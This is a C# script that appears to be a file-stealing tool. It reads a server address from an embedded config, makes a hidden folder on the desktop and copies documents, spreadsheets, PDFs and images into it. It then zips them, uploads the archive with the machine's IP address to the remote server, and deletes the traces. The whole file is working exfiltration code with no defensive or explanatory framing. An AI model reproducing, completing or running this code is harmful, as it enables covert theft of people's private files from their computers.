using System;
using System.IO;
using System.Linq;
using System.IO.Compression;
using System.Threading.Tasks;
using System.Collections.Generic;
using static Utils;

void ValidateServerHeartbeat(string serverURL, int portNumber) {
    PrintTask($"Attempting to ping {serverURL}:{portNumber}");

    if (Host.Ping(serverURL, portNumber)) return;
    throw new Exception("Server is not live. Ending task..");
}

void CreateHiddenFolder(string path) {
    if (Directory.Exists(path)) Directory.Delete(path, true);

    PrintTask($"Creating the hidden folder {path}");
    DirectoryInfo directoryInfo = Directory.CreateDirectory(path);
    directoryInfo.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
}

void RetrieveTargetedFiles(string rootPath, string targetPath, string[] targetedFileFormats) {
    PrintTask($"Recursively copying all targeted files from {rootPath} to {targetPath}");

    IEnumerable<string> fileEnumerable = Directory.EnumerateFiles(rootPath, "*", SearchOption.AllDirectories);
    GetFileEnumerator.IgnorePrivilegedFiles(fileEnumerable)
                     .AsParallel()
                     .Where(file => targetedFileFormats.Contains(Path.GetExtension(file)))
                     .ForAll(file => {
                         string destinationFile = $"{targetPath}/{Path.GetFileName(file)}";

                         while (File.Exists(destinationFile)) {
                             string fileName = Path.GetFileNameWithoutExtension(destinationFile);
                             string fileExtension = Path.GetExtension(destinationFile);
                             destinationFile = $"{targetPath}/{fileName}-1{fileExtension}";
                         }

                         try {
                             File.Copy(file, destinationFile);
                         }

                         catch (IOException) {
                             // Occasionally, multiple threads may attempt to copy a file of the same name at the same time.
                             // This will not be caught by the while loop above. We have no choice but to give up on the files here.
                             // If this condition is unacceptable and speed is of no concern, consider using ToList().ForEach() instead of ForAll().
                         }
                     });
}

string CompressTargetedFiles(string targetPath) {
    PrintTask($"Compressing all files in {targetPath} to {targetPath}");

    string zipFileName = $"{targetPath}.zip";

    if (File.Exists(zipFileName)) File.Delete(zipFileName);
    ZipFile.CreateFromDirectory(targetPath, zipFileName);

    return zipFileName;
}

async Task UploadToServer(string hostNameOrAddress, string zipFileName) {
    PrintTask($"Uploading files to {hostNameOrAddress}");

    using Request formData = Request.CreateFormData();
    await formData.AddString("ip", Host.GetIP())
                  .AddFile("file", zipFileName)
                  .Post(hostNameOrAddress);
}

async Task Main() {
    string[] targetedFileFormats = {
        ".odt",
        ".doc",
        ".docx",
        ".xls",
        ".xlsx",
        ".csv",
        ".ppt",
        ".pptx",
        ".pdf",
        ".png",
        ".jpg",
        ".jpeg",
        ".bmp"
    };

    Resources resources = new Resources();
    XMLHelper xmlHelper = XMLHelper.Load(resources.GetStream("config.xml"));

    int portNumber = xmlHelper.GetIntByTagName("port");
    string serverURL = xmlHelper.GetTextByTagName("name");
    ValidateServerHeartbeat(serverURL, portNumber);

    string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
    string hiddenDirectoryPath = $"{desktopPath}/.tmp";
    string targetDirectoryPath = desktopPath;

    CreateHiddenFolder(hiddenDirectoryPath);
    RetrieveTargetedFiles(targetDirectoryPath, hiddenDirectoryPath, targetedFileFormats);

    string zipFileName = CompressTargetedFiles(hiddenDirectoryPath);
    await UploadToServer($"http://{serverURL}:{portNumber}", zipFileName);

    FileSystem.RemoveAll(hiddenDirectoryPath, zipFileName);
}

await Main();